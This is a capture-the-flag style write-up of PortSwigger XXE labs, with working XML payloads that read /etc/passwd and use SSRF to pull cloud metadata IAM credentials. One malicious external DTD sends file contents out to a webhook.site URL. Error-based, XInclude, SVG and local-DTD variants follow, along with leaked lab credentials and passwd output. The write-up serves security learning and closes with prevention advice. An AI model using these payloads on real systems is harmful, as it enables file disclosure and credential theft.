# XML External Entity (XXE) Injection

> PortSwigger Web Security Academy · **6/9** labs completed

XXE abuses XML parsers that process external entities. It can read local files, trigger SSRF, or leak data through out-of-band or error-based channels.

[← Back to the index](README.md)

## Contents

- [How to approach this vulnerability](#how-to-approach-this-vulnerability)
- [1. Exploiting XXE using external entities to retrieve files](#1-exploiting-xxe-using-external-entities-to-retrieve-files)
- [2. Exploiting XXE to perform SSRF attacks](#2-exploiting-xxe-to-perform-ssrf-attacks)
- [3. Exploiting blind XXE to exfiltrate data using a malicious external DTD](#3-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd)
- [4. Exploiting blind XXE to retrieve data via error messages](#4-exploiting-blind-xxe-to-retrieve-data-via-error-messages)
- [5. Exploiting XInclude to retrieve files](#5-exploiting-xinclude-to-retrieve-files)
- [6. Exploiting XXE via image file upload](#6-exploiting-xxe-via-image-file-upload)
- [7. Exploiting XXE to retrieve data by repurposing a local DTD](#7-exploiting-xxe-to-retrieve-data-by-repurposing-a-local-dtd)
- [Prevention](#prevention)

## How to approach this vulnerability

Checklist of things to check when you suspect this class of bug, covering the different ways it shows up:

- Find every endpoint that accepts XML, or a format that can be XML underneath (SOAP, file formats like SVG, DOCX, XLSX, RSS import).
- Test for basic external entity injection: define `<!ENTITY xxe SYSTEM "file:///etc/passwd">` and reference it, then check if file contents come back in the response.
- If the response doesn't echo anything, test for XXE-based SSRF by pointing the entity at an internal URL or your out-of-band listener.
- If there's no direct output and no SSRF channel, test blind exfiltration via a malicious external DTD hosted on your own server, which reads the file and sends it out via a parameter entity.
- If regular entities are blocked, test error-based exfiltration: trigger a parser error that includes file content in the error message.
- Test `XInclude` as an alternative when you can only control a value inside an element, not the full XML document.
- Test XXE via non-obvious XML-based file types the app accepts as uploads (SVG avatars, Office documents, etc.).

## Lab write-ups

### 1. Exploiting XXE using external entities to retrieve files

**Lab:** [Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)

- In this lab the vuln exists in the stock check functionality
- To exploit this go to any product and check their stock
- Get the request and you can see that it is using XML to retrieve the data
- Add a external entity with internal DTD to retrieve the /etc/passwd files
- The payload is

```xml
<?xml version="1.0"?>
  <!DOCTYPE stockCheck [
  <!ENTITY xyz SYSTEM "file:///etc/passwd">
  ]>
  <stockCheck>
	  <productId>&xyz;</productId>
	  <storeId>1</storeId>
	</stockCheck>
```

---

### 2. Exploiting XXE to perform SSRF attacks

**Lab:** [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)

- In this lab we will be able to perform SSRF attack to the internal ip where cloud services are running in 169.254.169.254
- To do that do the same steps as lab 1 until the code but replace the url with the /etc/passwd
- The payload will be

```xml
<?xml version="1.0"?>
  <!DOCTYPE stockCheck [
  <!ENTITY xyz SYSTEM "http://169.254.169.254/">
  ]>
  <stockCheck>
	  <productId>&xyz;</productId>
	  <storeId>1</storeId>
	</stockCheck>
```

- When you submit it there will be an error with invalid product id with a endpoint separated by a colon like `invalid-productid:latest`
- So latest is an endpoint now add latest in the payload after the ip like `http://169.254.169.254/latest/`
- Now you will again get an error which exposes the next endpoint
- Do this until you get the secret access key
- So the final url will be `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/`
- Now you got the key

```
response

  "Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2026-11-10T15:24:08.252437924Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "FKcCYX4Ah83WD2xbTvrH",
  "SecretAccessKey" : "ofpIw6O4in4BzIhz8H1IsZfkMiGRr0eFoLT3N5IP",
  "Token" : "wb72d9OR6LY0voKYCjVGOppAuc5PbQtiEtWKnA0vJcTPbvQNvEjVIpf1FFNMBN4tTqYodcKHHoqIXyPlBvWrw3MA5DsAoOtIZue8IcHc85eZil9oTpdw4aYqFMgbvimzHc71RrRYeLP3z6Nc5280y6iapGGZxgYWqe8mMJqrhIASqWB5XODq7dDTf4lNEoBuhXxAGBsSikD6rsz7UfWfnlQJRW4d73pL9HacOQ0ZeY70sdSkY85hYpGVTFNigvwF",
  "Expiration" : "2032-11-08T15:24:08.252437924Z"
}"
```

---

### 3. Exploiting blind XXE to exfiltrate data using a malicious external DTD

**Lab:** [Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)

- In this lab we need to use an external OAST to get the results
- To do this we can use webhook
- First we need to get the stock check endpoint
- Now we will write the malicious dtd payload and put it in the exploit server
- The payload is

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/0110884d-3a8e-4ec7-9d07-d9e68789fa99/?x=%file;'>">
%eval;
%exfil;
```

- The reason to use &#x25 instead of parameter entity is because % has a different meaning inside a DTD code which is referencing a parameter entity so this is the HTML hexadecimal  value for `%-> &#x25`
- We are using 2 entities to get the results in webhook is because DTD wont allow a parameter entity to point to another parameter entity, so we need to use 2 entities so that we can assign it dynamically
- The problem is a restriction on parameter entity references inside markup declarations in the DTD's internal subset
- Now add the payload in exploit server
- Now take the url of exploit server `https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit`
- This lab is protected against third party apps like webhook and the firewall blocks the outbound request so this is where I stopped this lab and didn't finish it completely

---

### 4. Exploiting blind XXE to retrieve data via error messages

**Lab:** [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)

- This is same as the last lab. the difference is here we will not use OAST to get the result, instead we will cause an error message and try to get the file content
- The payload to put it in the exploit server is

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'> ">
%eval;
%exfil;
```

- The above payload will return an error because when the exfil entity tries to get the contents of etc/passwd, it gets the content but when eval entity is resolved there wont be any file like `/invalid/root:x:0:0` right so that becomes an error telling that the file doesn't exist
- This payload is set in the exploit server and we will copy this exploit server's url and paste it in the stock checker and add that url in the external entity
- The idea for these kind of labs are we are writing the malicious DTD code in the server because when we try to write it directly in the product check, this wont return the result since it is a blind XXE
- Then after writing the code in the server, we will point the url of the server as external entity in the product check and we will create that entity inside the dtd in product check endpoint
- So when the application runs, it points to the malicious code and gets executed
- The payload to write it in the product check place is

```xml
<!DOCTYPE stockCheck [
<!ENTITY % abc SYSTEM "https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">
%abc;
]>
```

- No send the request and you will get the details of the file with an error message

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2415

"XML parser exited with error: java.io.FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false (No such file or directory)"
```

---

### 5. Exploiting XInclude to retrieve files

**Lab:** [Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)

- In this lab the xml document is not explicitly shown to be used for retrieving products so that's where XInclude comes in
- XInclude is a feature where it allows one xml document to include the contents of the another external resources
- XInclude allows an XML document to fetch external content and insert it into the current XML document.
- The payload is, add this line to products

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
	  <xi:include parse="text" href="file:///etc/passwd"/>
  </foo>
```

- First we are defining the root element and assigning the XInclude namespace to the prefix
- Then we are trying to include the file to the existing xml document and parse="text" is important because xml parsers generally looks for xml tag but /etc/passwd is a text formatted file so we need to specify it

---

### 6. Exploiting XXE via image file upload

**Lab:** [Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)

- In this lab we are going to upload an svg file and get the result inside the svg element
- We are going to create the custom svg file and then upload it. when we see our post then we will be able to see the hostname in it

```xml
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg"
     width="128" height="128">
  <text x="0" y="20" font-size="16">&xxe;</text>
</svg>
```

- We are trying to build a svg file with the external entity in it which returns the hostname
- The value is `36e118568dbd`

---

### 7. Exploiting XXE to retrieve data by repurposing a local DTD

**Lab:** [Exploiting XXE to retrieve data by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)

- In this lab we don't write a DTD and it gets blocked. so we are going to get a already defined DTD and redefines an pre existing entity to exploit it
- First we need to get the directory of the dtd file
- Then the entity name
- After that we will create the dtd payload which is used for error based xxe and create an error
- Now we will get the result with the error

```xml
<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE stockCheck [
  <!ENTITY % file SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
  <!ENTITY &#x25; needfile SYSTEM "file:///etc/passwd">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; exfil SYSTEM &#x27;file:///invalid/&#x25;needfile;&#x27;>">
  &#x25;eval;
  &#x25;exfil;
  '>
  %file;
  ]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```

- The output is

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2415

"XML parser exited with error: java.io.FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false (No such file or directory)"
```

---

## Prevention

How this class of bug is fixed, based on what these labs showed:

- Disable DTDs and external entity resolution in the XML parser. This is the most important fix.
- Disable XInclude support, and be careful with file types that contain XML (SVG, DOCX, XLSX).
- Prefer simpler formats such as JSON when XML features are not needed.
- Restrict outbound network access from the server to limit blind and out-of-band attacks.
- Keep XML libraries updated. Defaults differ between parsers and versions.
